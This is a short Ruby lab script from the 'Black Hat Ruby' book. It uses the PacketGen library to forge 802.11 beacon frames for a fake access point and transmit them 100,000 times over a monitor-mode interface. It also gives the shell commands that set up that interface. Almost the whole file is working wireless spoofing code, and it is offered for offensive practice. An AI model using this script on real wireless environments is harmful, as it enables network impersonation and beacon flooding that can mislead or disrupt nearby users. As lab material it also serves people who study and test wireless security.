#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Create Rogue Wireless Access Point
#   Wireshark filter: wlan.fc.type == 0
# Requirements:
#   $ apt install libpcap-dev
#   $ gem install packetgen
# 
#   Enable monitoring mode on your wireless card as *root*
#   $ iw dev
#   $ iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up
# 
require 'packetgen'

iface     = 'mon0'
broadcast = "ff:ff:ff:ff:ff:ff"
bssid     = "aa:aa:aa:aa:aa:aa"
ssid      = "BlackHatRuby 💎"

pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                               .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
pp pkt
# pkt.to_w(iface, number: 100000, interval: 0.5)
100000.times do
  pkt.to_w(iface)
  puts 'Fake Beacon' + ssid + ' via iface: ' + iface
end


# radio  = PacketGen.gen('RadioTap')
# dot11  = radio.add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
# beacon = dot11.add('Dot11::Beacon', interval: 0x600, cap: 0x401)
# beacon.dot11_beacon.elements.push({type: 'SSID', value: ssid})

# pp beacon
# beacon.to_w(iface, number: 100000, interval: 0.5)

# 100000.times do
#   pkt.to_w(iface)
#   puts 'Fake Beacon' + ssid + ' via iface: ' + iface
# end

